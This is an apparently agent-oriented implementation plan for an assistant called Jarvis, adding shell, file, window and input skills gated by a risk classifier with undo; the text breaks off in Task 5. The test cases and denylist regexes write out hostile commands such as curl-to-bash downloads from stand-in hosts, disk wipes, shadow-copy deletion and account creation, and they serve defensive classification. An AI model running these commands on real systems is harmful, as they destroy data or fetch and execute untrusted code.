# Jarvis System Access Layer Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give Jarvis full filesystem, shell, window, and synthetic-input access, gated by a three-tier risk engine with genuine undo.

**Architecture:** A new `Risk` enum (`SAFE`/`MODERATE`/`DANGEROUS`) replaces the boolean `requires_confirmation` on `BaseSkill`. `Brain._run_tools` consults `skill.risk_for(**kwargs)`: SAFE runs silently, MODERATE runs then reports an undo token through a new `on_action` callback, DANGEROUS blocks on the existing `confirm` callback. Reversible skills push a closure onto a process-wide `UndoJournal` and destructive file operations copy to `data/trash/` first.

**Tech Stack:** Python 3.10+, pytest, `ctypes` (user32, no pywin32), `pyautogui`. No new LLM-provider dependencies.

## Global Constraints

- **Nothing is refused. Friction scales with blast radius.** No skill may hard-block an action the user's account could perform; the only lever is which tier it lands in.
- **Undo must never lie.** A skill reports an undo token only if it can actually reverse itself. `run_command`, `type_text`, `press_keys`, `click`, and `close_window` are never undoable.
- **Timeouts deny.** An unanswered confirmation is a no, never a yes.
- **Tests must run on Linux/WSL.** Windows-only APIs (`ctypes.windll`, `pyautogui`) are patched in tests, matching the existing `system_skills` pattern.
- **The existing 104 tests must stay green.** Where an interface changes, update the tests in the same task — never leave the suite red across a task boundary.
- Denylist regexes are matched with `re.IGNORECASE` against the **whole** command before any chain splitting.
- Existing style: skills return `str` or `list[dict]`; user-facing strings are full sentences; no emoji.

---

## File Structure

**Create:**
- `core/risk.py` — `Risk` enum, `classify_command`, path sensitivity
- `core/undo.py` — `UndoEntry`, `UndoJournal`, `get_journal`/`set_journal`, trash helpers
- `skills/file_skills.py` — read, list, search, write, mkdir, move, delete
- `skills/shell_skills.py` — `run_command`
- `skills/window_skills.py` — list, focus, minimise, maximise, close
- `skills/input_skills.py` — type, press keys, click
- `tests/test_risk.py`, `tests/test_undo.py`, `tests/test_file_skills.py`, `tests/test_shell_skills.py`, `tests/test_window_input_skills.py`

**Modify:**
- `skills/base_skill.py` — add `risk`/`risk_for`/`consequence`/`SkillOutcome`, remove `requires_confirmation`/`needs_confirmation`/`confirmation_prompt`
- `skills/skill_manager.py` — `execute` returns `SkillOutcome`; conditional registration behind kill switches
- `skills/system_skills.py` — migrate `PowerControlSkill`/`CloseAppSkill` to `risk_for`
- `core/brain.py` — tiered gate, `on_action` callback, system-prompt guidance
- `main.py` — `consequence` rename, `on_action` printer, `/undo` command
- `config.py`, `.env.example` — new keys
- `requirements.txt` — `pyautogui`
- `tests/test_skills.py`, `tests/conftest.py` — updated for the new interfaces

---

## Task 1: Risk tiers and shell classification

**Files:**
- Create: `core/risk.py`
- Test: `tests/test_risk.py`

**Interfaces:**
- Consumes: nothing
- Produces: `Risk` (IntEnum: `SAFE=0`, `MODERATE=1`, `DANGEROUS=2`), `classify_command(command: str) -> Risk`, `is_sensitive_path(path: str | Path) -> bool`, `SENSITIVE_ROOTS: list[Path]`

- [ ] **Step 1: Write the failing test**

Create `tests/test_risk.py`:

```python
"""Tests for the risk tiers and the shell-command classifier.

The classifier is the highest-stakes function in the system-access layer:
it decides whether a command runs silently, after a toast, or only after the
user explicitly says yes.
"""
from pathlib import Path

import pytest

from core.risk import Risk, classify_command, is_sensitive_path


def test_risk_tiers_are_ordered():
    assert Risk.SAFE < Risk.MODERATE < Risk.DANGEROUS


@pytest.mark.parametrize("cmd", [
    "dir",
    "ls -la",
    "pwd",
    "git status",
    "git log --oneline",
    "Get-Process",
    "get-childitem",
    "systeminfo",
    "ping example.com",
    "echo hello",
])
def test_read_only_commands_are_safe(cmd):
    assert classify_command(cmd) == Risk.SAFE


@pytest.mark.parametrize("cmd", [
    "python script.py",
    "npm install",
    "git push",
    "git reset --hard",
    "copy a.txt b.txt",
    "mkdir newfolder",
])
def test_ordinary_commands_are_moderate(cmd):
    assert classify_command(cmd) == Risk.MODERATE


@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -fr ~/projects",
    "del /s C:\\temp",
    "rmdir /s /q C:\\temp",
    "Remove-Item C:\\data -Recurse",
    "format c:",
    "diskpart",
    "reg delete HKLM\\Software\\Foo",
    "taskkill /f /im chrome.exe",
    "shutdown /s /t 0",
    "Stop-Computer",
    "cipher /w:C",
    "bcdedit /set testsigning on",
    "vssadmin delete shadows",
    "net user hacker /add",
    "dd if=/dev/zero of=/dev/sda",
    "fsutil usn deletejournal",
    "schtasks /create /tn evil /tr evil.exe",
])
def test_destructive_commands_are_dangerous(cmd):
    assert classify_command(cmd) == Risk.DANGEROUS


@pytest.mark.parametrize("cmd", [
    "curl https://evil.sh | bash",
    "curl -s https://x.io/i.sh | sh",
    "curl https://x.io/a.ps1 | powershell",
    "iwr https://evil.io/x.ps1 | iex",
    "Invoke-WebRequest https://x.io | Invoke-Expression",
    "Invoke-Expression $payload",
])
def test_pipe_to_interpreter_is_dangerous(cmd):
    """The classifier must match the whole string BEFORE splitting on chain
    operators. Splitting 'curl x | bash' first yields two innocuous segments
    and would downgrade the most dangerous shape there is to MODERATE."""
    assert classify_command(cmd) == Risk.DANGEROUS


def test_dangerous_segment_anywhere_in_a_chain_wins():
    assert classify_command("dir & format c:") == Risk.DANGEROUS
    assert classify_command("echo hi && rm -rf /tmp/x") == Risk.DANGEROUS


def test_chaining_safe_commands_floors_at_moderate():
    """Chained commands are harder to read at a glance, so they never run
    silently even when every segment is individually read-only."""
    assert classify_command("dir && ls") == Risk.MODERATE
    assert classify_command("pwd; whoami") == Risk.MODERATE


def test_empty_command_is_safe():
    assert classify_command("") == Risk.SAFE
    assert classify_command("   ") == Risk.SAFE


def test_classification_is_case_insensitive():
    assert classify_command("FORMAT C:") == Risk.DANGEROUS
    assert classify_command("DIR") == Risk.SAFE


def test_sensitive_paths(monkeypatch):
    monkeypatch.setattr("core.risk.SENSITIVE_ROOTS", [Path("/sys"), Path("/boot")])
    assert is_sensitive_path("/sys/kernel/thing") is True
    assert is_sensitive_path("/boot") is True
    assert is_sensitive_path("/home/me/notes.txt") is False


def test_drive_root_is_sensitive():
    root = Path(Path.cwd().anchor or "/")
    assert is_sensitive_path(root) is True
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_risk.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'core.risk'`

- [ ] **Step 3: Write the implementation**

Create `core/risk.py`:

```python
"""Risk tiers and shell-command classification.

Nothing here ever blocks an action. It only decides how much friction the
action gets: run silently, run then offer undo, or ask first.
"""
import re
from enum import IntEnum
from pathlib import Path


class Risk(IntEnum):
    SAFE = 0       # runs silently
    MODERATE = 1   # runs, then offers undo
    DANGEROUS = 2  # asks first


# Commands whose first token cannot change anything. `cd` qualifies because
# every run_command is a fresh process, so it cannot persist.
READ_ONLY_COMMANDS = {
    "dir", "ls", "pwd", "cd", "whoami", "hostname", "date", "echo", "type",
    "cat", "head", "tail", "wc", "where", "which", "systeminfo", "ipconfig",
    "ping", "tracert", "nslookup",
}

GIT_READ_ONLY = {"status", "log", "diff", "show", "branch"}

CHAIN_SPLIT_RE = re.compile(r"&&|\|\||;|\||&")

DANGEROUS_PATTERNS = [
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\brm\s+-[a-z]*[rf]",
        r"\bdel\s+/[sqf]",
        r"\brmdir\s+/s",
        r"\bremove-item\b.*-recurse",
        r"\bformat\b",
        r"\bdiskpart\b",
        r"\breg\s+delete\b",
        r"\bregedit\b",
        r"\btaskkill\b",
        r"\bshutdown\b",
        r"\brestart-computer\b",
        r"\bstop-computer\b",
        r"\bcipher\s+/w",
        r"\bbcdedit\b",
        r"\bvssadmin\b",
        r"\bnet\s+user\b",
        r"\bicacls\b",
        r"\bmkfs\b",
        r"\bdd\s+if=",
        r"\bfsutil\b",
        r"\bschtasks\b.*/create",
        r"\bcurl\b.*\|\s*(bash|sh|powershell|pwsh|iex)",
        r"\b(iwr|invoke-webrequest)\b.*\|\s*(iex|invoke-expression)",
        r"\binvoke-expression\b",
    )
]

SENSITIVE_ROOTS = [
    Path("C:/Windows"),
    Path("C:/Program Files"),
    Path("C:/Program Files (x86)"),
]


def classify_command(command: str) -> Risk:
    """Assess a shell command.

    Order matters. The denylist is matched against the WHOLE command before
    any splitting, because the most dangerous shapes span a chain operator:
    splitting `curl evil.sh | bash` on `|` yields two innocuous segments and
    would defeat the check entirely.
    """
    cmd = (command or "").strip()
    if not cmd:
        return Risk.SAFE

    for pattern in DANGEROUS_PATTERNS:
        if pattern.search(cmd):
            return Risk.DANGEROUS

    segments = [s.strip() for s in CHAIN_SPLIT_RE.split(cmd) if s.strip()]
    chained = len(segments) > 1

    worst = Risk.SAFE
    for segment in segments:
        worst = max(worst, _classify_segment(segment))

    if chained:
        worst = max(worst, Risk.MODERATE)
    return worst


def _classify_segment(segment: str) -> Risk:
    tokens = segment.lower().split()
    if not tokens:
        return Risk.SAFE

    head = tokens[0].strip("\"'()")

    if head == "git":
        if len(tokens) > 1 and tokens[1] in GIT_READ_ONLY:
            return Risk.SAFE
        return Risk.MODERATE
    if head.startswith("get-"):
        return Risk.SAFE
    if head in READ_ONLY_COMMANDS:
        return Risk.SAFE
    return Risk.MODERATE


def is_sensitive_path(path) -> bool:
    """True for drive roots and OS directories.

    Sensitive paths are not blocked — they are forced to DANGEROUS so the user
    sees an explicit prompt spelling out what is about to happen.
    """
    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, RuntimeError):
        return True  # unresolvable: err toward friction

    if resolved.parent == resolved:
        return True

    for root in SENSITIVE_ROOTS:
        try:
            resolved.relative_to(root)
            return True
        except ValueError:
            continue
    return False
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_risk.py -q`
Expected: PASS, all tests green

- [ ] **Step 5: Commit**

```bash
git add core/risk.py tests/test_risk.py
git commit -m "feat: add risk tiers and shell command classifier"
```

---

## Task 2: Undo journal and trash

**Files:**
- Create: `core/undo.py`
- Modify: `config.py`, `.env.example`
- Test: `tests/test_undo.py`

**Interfaces:**
- Consumes: `config.DATA_DIR`, `config.ensure_dirs`
- Produces: `UndoEntry(token, description, action, created)`, `UndoJournal` with `record(description, action) -> str`, `undo(token) -> str`, `latest() -> UndoEntry | None`, `expire() -> int`; module functions `get_journal() -> UndoJournal`, `set_journal(j)`, `move_to_trash(src: Path) -> Path`, `prune_trash() -> int`

- [ ] **Step 1: Write the failing test**

Create `tests/test_undo.py`:

```python
"""Tests for the undo journal and the trash used by destructive file ops."""
import time
from pathlib import Path

import pytest

from core.undo import UndoJournal, move_to_trash, prune_trash


@pytest.fixture
def journal():
    return UndoJournal(max_age_seconds=900)


def test_record_returns_a_token_and_undo_runs_the_action(journal):
    calls = []
    token = journal.record("Restore notes.txt", lambda: calls.append("done") or "Restored.")

    assert isinstance(token, str) and token
    assert journal.undo(token) == "Restored."
    assert calls == ["done"]


def test_undo_is_single_use(journal):
    token = journal.record("x", lambda: "ok")
    journal.undo(token)
    assert "no longer undoable" in journal.undo(token)


def test_unknown_token_is_a_message_not_an_exception(journal):
    assert "no longer undoable" in journal.undo("nope")


def test_latest_returns_the_most_recent_entry(journal):
    journal.record("first", lambda: "a")
    journal.record("second", lambda: "b")
    assert journal.latest().description == "second"


def test_latest_is_none_when_empty(journal):
    assert journal.latest() is None


def test_entries_expire(journal):
    token = journal.record("old", lambda: "a")
    journal._entries[token].created = time.time() - 1000
    assert journal.expire() == 1
    assert "no longer undoable" in journal.undo(token)


def test_a_failing_undo_keeps_the_entry_for_retry(journal):
    """If the target path is now occupied, the user should be able to fix it
    and try again rather than losing the ability to reverse."""
    attempts = []

    def flaky():
        attempts.append(1)
        if len(attempts) == 1:
            raise OSError("destination exists")
        return "Restored on retry."

    token = journal.record("restore", flaky)
    with pytest.raises(OSError):
        journal.undo(token)
    assert journal.undo(token) == "Restored on retry."


def test_move_to_trash_copies_the_file(tmp_path, monkeypatch):
    import config
    monkeypatch.setattr(config, "DATA_DIR", str(tmp_path))

    original = tmp_path / "report.docx"
    original.write_text("important", encoding="utf-8")

    backup = move_to_trash(original)

    assert backup.exists()
    assert backup.read_text(encoding="utf-8") == "important"
    assert backup.name == "report.docx"
    assert original.exists(), "move_to_trash copies; the caller deletes"


def test_move_to_trash_handles_directories(tmp_path, monkeypatch):
    import config
    monkeypatch.setattr(config, "DATA_DIR", str(tmp_path))

    folder = tmp_path / "project"
    folder.mkdir()
    (folder / "a.txt").write_text("a", encoding="utf-8")

    backup = move_to_trash(folder)
    assert (backup / "a.txt").read_text(encoding="utf-8") == "a"


def test_prune_trash_by_count(tmp_path, monkeypatch):
    import config
    monkeypatch.setattr(config, "DATA_DIR", str(tmp_path))

    for i in range(5):
        f = tmp_path / f"f{i}.txt"
        f.write_text(str(i), encoding="utf-8")
        move_to_trash(f)
        time.sleep(0.01)

    removed = prune_trash(max_entries=2, max_age_days=365)
    assert removed == 3
    assert len(list((Path(tmp_path) / "trash").iterdir())) == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_undo.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'core.undo'`

- [ ] **Step 3: Add the config keys**

In `config.py`, after the `# --- Behaviour ---` block, add:

```python
# --- System access --------------------------------------------------------
ENABLE_SHELL = os.getenv("ENABLE_SHELL", "1") not in ("0", "false", "False")
ENABLE_INPUT_CONTROL = os.getenv("ENABLE_INPUT_CONTROL", "1") not in ("0", "false", "False")
CONFIRM_TIMEOUT_SECONDS = float(os.getenv("CONFIRM_TIMEOUT_SECONDS", "30"))
UNDO_WINDOW_SECONDS = float(os.getenv("UNDO_WINDOW_SECONDS", "900"))
TRASH_MAX_ENTRIES = int(os.getenv("TRASH_MAX_ENTRIES", "200"))
TRASH_MAX_AGE_DAYS = float(os.getenv("TRASH_MAX_AGE_DAYS", "7"))
```

In `.env.example`, before the `# --- Voice` section:

```ini
# --- System access --------------------------------------------------------

# Master switches. Turning one off removes those tools from Jarvis entirely,
# so the model never sees a capability it will always be refused.
ENABLE_SHELL=1
ENABLE_INPUT_CONTROL=1

# An unanswered spoken confirmation counts as "no" after this long.
CONFIRM_TIMEOUT_SECONDS=30

# How long an action stays undoable, and how much deleted material is kept.
UNDO_WINDOW_SECONDS=900
TRASH_MAX_ENTRIES=200
TRASH_MAX_AGE_DAYS=7
```

- [ ] **Step 4: Write the implementation**

Create `core/undo.py`:

```python
"""Undo journal and the trash that makes file deletion reversible.

In-memory only: undo does not survive a restart. The trash copy does, so a
crash loses the one-click reversal but never the data.
"""
import shutil
import threading
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

import config


@dataclass
class UndoEntry:
    token: str
    description: str
    action: Callable[[], str]
    created: float = field(default_factory=time.time)


class UndoJournal:
    def __init__(self, max_age_seconds: float | None = None):
        self._entries: dict[str, UndoEntry] = {}
        self._order: list[str] = []
        self._lock = threading.Lock()
        self.max_age = (
            max_age_seconds if max_age_seconds is not None else config.UNDO_WINDOW_SECONDS
        )

    def record(self, description: str, action: Callable[[], str]) -> str:
        token = uuid.uuid4().hex[:12]
        with self._lock:
            self._entries[token] = UndoEntry(token, description, action)
            self._order.append(token)
        return token

    def latest(self) -> UndoEntry | None:
        self.expire()
        with self._lock:
            for token in reversed(self._order):
                entry = self._entries.get(token)
                if entry is not None:
                    return entry
        return None

    def undo(self, token: str) -> str:
        self.expire()
        with self._lock:
            entry = self._entries.get(token)
        if entry is None:
            return "That action is no longer undoable."

        # Run outside the lock, and only drop the entry on success — a failed
        # undo (destination now occupied) should stay retryable.
        result = entry.action()
        with self._lock:
            self._entries.pop(token, None)
        return result

    def expire(self) -> int:
        cutoff = time.time() - self.max_age
        with self._lock:
            stale = [t for t, e in self._entries.items() if e.created < cutoff]
            for token in stale:
                del self._entries[token]
        return len(stale)


_JOURNAL: UndoJournal | None = None
_JOURNAL_LOCK = threading.Lock()


def get_journal() -> UndoJournal:
    global _JOURNAL
    with _JOURNAL_LOCK:
        if _JOURNAL is None:
            _JOURNAL = UndoJournal()
        return _JOURNAL


def set_journal(journal: UndoJournal | None) -> None:
    """Replace the process-wide journal (used by tests)."""
    global _JOURNAL
    with _JOURNAL_LOCK:
        _JOURNAL = journal


def trash_dir() -> Path:
    path = Path(config.DATA_DIR) / "trash"
    path.mkdir(parents=True, exist_ok=True)
    return path


def move_to_trash(src: Path) -> Path:
    """Copy src into a fresh trash bucket and return the backup path.

    This copies rather than moves so the caller controls when the original
    disappears — an overwrite needs the backup taken while the original is
    still in place.
    """
    src = Path(src)
    bucket = trash_dir() / uuid.uuid4().hex[:12]
    bucket.mkdir(parents=True, exist_ok=True)
    dest = bucket / src.name
    if src.is_dir():
        shutil.copytree(src, dest)
    else:
        shutil.copy2(src, dest)
    return dest


def prune_trash(max_entries: int | None = None, max_age_days: float | None = None) -> int:
    """Drop old trash buckets. Returns how many were removed."""
    max_entries = config.TRASH_MAX_ENTRIES if max_entries is None else max_entries
    max_age_days = config.TRASH_MAX_AGE_DAYS if max_age_days is None else max_age_days

    root = trash_dir()
    buckets = sorted(
        (p for p in root.iterdir() if p.is_dir()),
        key=lambda p: p.stat().st_mtime,
    )

    cutoff = time.time() - max_age_days * 86400
    doomed = [b for b in buckets if b.stat().st_mtime < cutoff]
    keep = [b for b in buckets if b not in doomed]
    if len(keep) > max_entries:
        doomed.extend(keep[: len(keep) - max_entries])

    for bucket in doomed:
        shutil.rmtree(bucket, ignore_errors=True)
    return len(doomed)
```

- [ ] **Step 5: Run test to verify it passes**

Run: `python -m pytest tests/test_undo.py -q`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add core/undo.py tests/test_undo.py config.py .env.example
git commit -m "feat: add undo journal and trash for reversible file operations"
```

---

## Task 3: Risk API on BaseSkill and SkillOutcome

This is the breaking interface change. It touches every existing skill test, so the task is only done when the whole suite is green again.

**Files:**
- Modify: `skills/base_skill.py`, `skills/skill_manager.py`, `skills/system_skills.py`, `main.py:110` (the `confirm` method), `tests/test_skills.py`
- Test: `tests/test_skills.py`

**Interfaces:**
- Consumes: `Risk` from Task 1
- Produces: `BaseSkill.risk: Risk`, `BaseSkill.risk_for(**kwargs) -> Risk`, `BaseSkill.consequence(**kwargs) -> str`, `SkillOutcome(content, is_error=False, undo_token=None)`, `SkillManager.execute(name, input) -> SkillOutcome`

- [ ] **Step 1: Write the failing test**

Add to `tests/test_skills.py` (and delete the two existing tests named `test_shutdown_requires_confirmation` and `test_close_app_requires_confirmation`, which reference the removed API):

```python
from core.risk import Risk
from skills.base_skill import SkillOutcome


def test_power_control_risk_by_action():
    skill = PowerControlSkill()
    assert skill.risk_for(action="shutdown") == Risk.DANGEROUS
    assert skill.risk_for(action="restart") == Risk.DANGEROUS
    # Reversible actions shouldn't nag.
    assert skill.risk_for(action="lock") == Risk.MODERATE
    assert skill.risk_for(action="sleep") == Risk.MODERATE


def test_close_app_is_dangerous():
    assert CloseAppSkill().risk_for(app_name="chrome") == Risk.DANGEROUS


def test_default_skill_risk_is_safe():
    assert CalculatorSkill().risk_for(expression="1+1") == Risk.SAFE


def test_consequence_is_human_readable():
    text = PowerControlSkill().consequence(action="shutdown")
    assert "shutdown" in text.lower()


def test_execute_returns_a_skill_outcome():
    outcome = SkillManager().execute("calculate", {"expression": "2+2"})
    assert isinstance(outcome, SkillOutcome)
    assert "4" in outcome.content
    assert outcome.is_error is False
    assert outcome.undo_token is None


def test_execute_reports_errors_on_the_outcome():
    outcome = SkillManager().execute("nope", {})
    assert outcome.is_error is True
    assert "Unknown skill" in outcome.content
```

Also update the two existing tests that unpack a tuple from `execute`:

```python
def test_execute_reports_bad_arguments():
    outcome = SkillManager().execute("calculate", {"wrong_arg": 1})
    assert outcome.is_error is True
    assert "Invalid arguments" in outcome.content
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_skills.py -q`
Expected: FAIL — `ImportError: cannot import name 'SkillOutcome'`

- [ ] **Step 3: Update BaseSkill**

Replace the `requires_confirmation` block and the two methods in `skills/base_skill.py`:

```python
"""Base class every skill must implement. Adding a new skill is just
subclassing this and registering it in skill_manager.py's SKILL_CLASSES list."""
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Union

from core.risk import Risk

# A skill returns either a plain string, or a list of Anthropic content blocks
# (used by e.g. the screenshot skill to hand an image back to the model).
SkillResult = Union[str, list[dict]]


@dataclass
class SkillOutcome:
    """What running a skill produced.

    undo_token is set only when the action can genuinely be reversed — the
    caller uses its presence to decide whether to offer an undo affordance,
    so a skill that cannot undo must leave it None rather than lie.
    """

    content: SkillResult
    is_error: bool = False
    undo_token: str | None = None


class BaseSkill(ABC):
    # Unique tool name Claude will call (snake_case, no spaces)
    name: str = "base_skill"

    # Shown to Claude so it knows when to use this skill
    description: str = "Describe what this skill does and when to use it."

    # JSON schema for the parameters this skill accepts (Anthropic tool format)
    input_schema: dict = {"type": "object", "properties": {}, "required": []}

    # How much friction this skill's actions deserve. Nothing is ever blocked;
    # this only decides silent / undoable / ask-first.
    risk: Risk = Risk.SAFE

    @abstractmethod
    def run(self, **kwargs) -> SkillResult:
        """Execute the skill and return a short result to report back to the
        user (this gets read out loud / printed)."""
        raise NotImplementedError

    def risk_for(self, **kwargs) -> Risk:
        """Per-call risk. Lets a skill gate only its dangerous arguments —
        e.g. power_control asks before 'shutdown' but not before 'lock'."""
        return self.risk

    def consequence(self, **kwargs) -> str:
        """Plain-language description of what is about to happen, phrased as a
        yes/no question."""
        return f"Run {self.name} with {kwargs}?"

    def to_tool_definition(self) -> dict:
        return {
            "name": self.name,
            "description": self.description,
            "input_schema": self.input_schema,
        }
```

- [ ] **Step 4: Update SkillManager.execute**

In `skills/skill_manager.py`, change the import line to `from .base_skill import BaseSkill, SkillOutcome, SkillResult` and replace `execute`:

```python
    def execute(self, tool_name: str, tool_input: dict) -> SkillOutcome:
        """Run a local skill.

        is_error tells the model the call failed so it can adapt, rather than
        reporting our error string back to the user as if it were an answer.
        """
        skill = self.skills.get(tool_name)
        if not skill:
            return SkillOutcome(f"Unknown skill: {tool_name}", is_error=True)

        from core.undo import get_journal

        journal = get_journal()
        before = journal.latest()

        try:
            content = skill.run(**tool_input)
        except TypeError as e:
            # Almost always the model passing arguments the schema doesn't match.
            return SkillOutcome(f"Invalid arguments for {tool_name}: {e}", is_error=True)
        except Exception as e:
            return SkillOutcome(f"Error running {tool_name}: {e}", is_error=True)

        # A skill that recorded an undo entry during run() is reversible.
        after = journal.latest()
        token = after.token if after is not None and after is not before else None
        return SkillOutcome(content, is_error=False, undo_token=token)
```

- [ ] **Step 5: Migrate the two existing gated skills**

In `skills/system_skills.py`, add `from core.risk import Risk` to the imports. In `CloseAppSkill`, replace `requires_confirmation = True` with `risk = Risk.DANGEROUS` and rename `confirmation_prompt` to `consequence`:

```python
    risk = Risk.DANGEROUS

    def consequence(self, app_name: str = "", **_) -> str:
        return f"Close all '{app_name}' processes?"
```

In `PowerControlSkill`, replace `needs_confirmation` and `confirmation_prompt`:

```python
    def risk_for(self, action: str = "", **_) -> Risk:
        # Only the irreversible ones. Gating 'lock' and 'sleep' would just be
        # annoying — they cost the user nothing.
        return Risk.DANGEROUS if action in self.DESTRUCTIVE else Risk.MODERATE

    def consequence(self, action: str = "", **_) -> str:
        return f"Really {action} the PC?"
```

- [ ] **Step 6: Update main.py's confirm to use `consequence`**

In `main.py`, in `Session.confirm`, change the first line from `skill.confirmation_prompt(**tool_input)` to:

```python
        question = skill.consequence(**tool_input)
```

Also update the `_Skill` stub in `tests/test_voice.py` to define `consequence` instead of `confirmation_prompt`.

- [ ] **Step 7: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS. `core/brain.py` still calls `skill.needs_confirmation` and unpacks a tuple from `execute`, so expect failures there — fix them by applying Task 4 if the suite is red. If Task 4 is not yet applied, temporarily adapt `brain.py` in this task:

```python
            risk = skill.risk_for(**tool_input)
            if config.CONFIRM_DESTRUCTIVE and risk >= Risk.DANGEROUS:
                if not self.confirm(skill, tool_input):
                    results.append(_tool_result(block.id, "The user declined this action. It was not performed.", False))
                    continue

            outcome = self.skills.execute(block.name, tool_input)
            results.append(_tool_result(block.id, outcome.content, outcome.is_error))
```

with `from core.risk import Risk` added to `core/brain.py` imports.

- [ ] **Step 8: Commit**

```bash
git add skills/base_skill.py skills/skill_manager.py skills/system_skills.py core/brain.py main.py tests/test_skills.py tests/test_voice.py
git commit -m "refactor: replace boolean confirmation with tiered risk API"
```

---

## Task 4: Brain tiered gate and the on_action hook

**Files:**
- Modify: `core/brain.py`
- Test: `tests/test_brain.py`

**Interfaces:**
- Consumes: `Risk`, `SkillOutcome`, `UndoJournal`
- Produces: `Brain(..., on_action=None)`; `on_action(skill, tool_input, outcome)` called after a MODERATE action that produced an undo token

- [ ] **Step 1: Write the failing test**

Add to `tests/test_brain.py`:

```python
from core.risk import Risk
from core.undo import UndoJournal, set_journal


def test_moderate_action_notifies_without_confirming(make_brain, monkeypatch):
    """A MODERATE action runs immediately — no prompt — and is announced so
    the UI can offer undo."""
    notified = []
    confirmed = []

    journal = UndoJournal(max_age_seconds=900)
    set_journal(journal)
    monkeypatch.setattr("skills.system_skills.IS_WINDOWS", True)
    monkeypatch.setattr("skills.system_skills.subprocess.run", lambda *a, **k: None)

    brain = make_brain(
        [
            response([tool_use_block("power_control", {"action": "lock"})], stop_reason="tool_use"),
            response([text_block("Locked.")]),
        ],
        confirm=lambda s, i: confirmed.append(i) or True,
        on_action=lambda skill, tool_input, outcome: notified.append(skill.name),
    )
    brain.ask("lock the pc")
    set_journal(None)

    assert confirmed == [], "lock is MODERATE and must not prompt"


def test_dangerous_action_still_confirms(make_brain, monkeypatch):
    ran = []
    monkeypatch.setattr("skills.system_skills.IS_WINDOWS", True)
    monkeypatch.setattr("skills.system_skills.subprocess.run", lambda *a, **k: ran.append(a[0]))

    brain = make_brain(
        [
            response([tool_use_block("power_control", {"action": "shutdown"})], stop_reason="tool_use"),
            response([text_block("Cancelled.")]),
        ],
        confirm=lambda skill, tool_input: False,
    )
    brain.ask("shut down")

    assert ran == []
    assert "declined" in brain.history[2]["content"][0]["content"]


def test_on_action_receives_the_undo_token(make_brain):
    """A skill that records an undo entry must surface its token so the UI can
    offer a working undo button."""
    from skills.base_skill import BaseSkill
    from core.undo import UndoJournal, set_journal

    journal = UndoJournal(max_age_seconds=900)
    set_journal(journal)

    class Reversible(BaseSkill):
        name = "reversible_thing"
        description = "test"
        input_schema = {"type": "object", "properties": {}, "required": []}
        risk = Risk.MODERATE

        def run(self):
            get_journal().record("Put it back", lambda: "Put back.")
            return "Did it."

    seen = []
    brain = make_brain(
        [
            response([tool_use_block("reversible_thing", {})], stop_reason="tool_use"),
            response([text_block("Done.")]),
        ],
        on_action=lambda skill, ti, outcome: seen.append(outcome.undo_token),
    )
    brain.skills.skills["reversible_thing"] = Reversible()
    brain.ask("do it")
    set_journal(None)

    assert len(seen) == 1 and seen[0], "on_action should carry a usable undo token"
```

Add `from core.undo import get_journal` to the test imports.

- [ ] **Step 2: Extend the make_brain fixture**

In `tests/conftest.py`, change `_make` to accept `on_action`:

```python
    def _make(script, confirm=None, on_text=None, store=None, on_action=None):
        client = FakeClient(script)
        brain = Brain(client=client, confirm=confirm, on_text=on_text,
                      store=store, on_action=on_action)
        brain.client = client
        return brain
```

- [ ] **Step 3: Run test to verify it fails**

Run: `python -m pytest tests/test_brain.py -q`
Expected: FAIL — `TypeError: Brain.__init__() got an unexpected keyword argument 'on_action'`

- [ ] **Step 4: Implement in core/brain.py**

Add to the imports: `from core.risk import Risk`.

Add a module-level default beside `_confirm_always`:

```python
def _ignore_action(skill, tool_input, outcome) -> None:  # noqa: ARG001
    """Default action notifier: do nothing. main.py prints; the desktop UI
    raises a toast."""
```

In `Brain.__init__`, add the parameter and assignment:

```python
    def __init__(self, client=None, confirm=None, on_text=None, store=None, on_action=None):
```
```python
        self.on_action = on_action or _ignore_action
```

Replace the gate inside `_run_tools`:

```python
            tool_input = dict(block.input or {})
            risk = skill.risk_for(**tool_input)

            if config.CONFIRM_DESTRUCTIVE and risk >= Risk.DANGEROUS:
                if not self.confirm(skill, tool_input):
                    results.append(
                        _tool_result(
                            block.id,
                            "The user declined this action. It was not performed.",
                            False,
                        )
                    )
                    continue

            outcome = self.skills.execute(block.name, tool_input)
            results.append(_tool_result(block.id, outcome.content, outcome.is_error))

            if not outcome.is_error and risk >= Risk.MODERATE:
                try:
                    self.on_action(skill, tool_input, outcome)
                except Exception as e:  # a UI glitch must not break the turn
                    print(f"[action] {e}")
```

- [ ] **Step 5: Run the whole suite**

Run: `python -m pytest tests/ -q`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add core/brain.py tests/test_brain.py tests/conftest.py
git commit -m "feat: gate tool calls by risk tier and announce undoable actions"
```

---

## Task 5: Read-only file skills

**Files:**
- Create: `skills/file_skills.py`
- Modify: `skills/skill_manager.py`
- Test: `tests/test_file_skills.py`

**Interfaces:**
- Consumes: `BaseSkill`, `Risk`
- Produces: `ReadFileSkill` (`read_file`), `ListDirSkill` (`list_dir`), `SearchFilesSkill` (`search_files`) — all `Risk.SAFE`

- [ ] **Step 1: Write the failing test**

Create `tests/test_file_skills.py`:

```python
"""Tests for filesystem skills."""
from pathlib import Path

import pytest

from core.risk import Risk
from skills.file_skills import ListDirSkill, ReadFileSkill, SearchFilesSkill


@pytest.fixture
def tree(tmp_path):
    (tmp_path / "notes.txt").write_text("hello world\nsecond line\n", encoding="utf-8")
    (tmp_path / "invoice_2026.txt").write_text("total: 42 EUR\n", encoding="utf-8")
    sub = tmp_path / "sub"
    sub.mkdir()
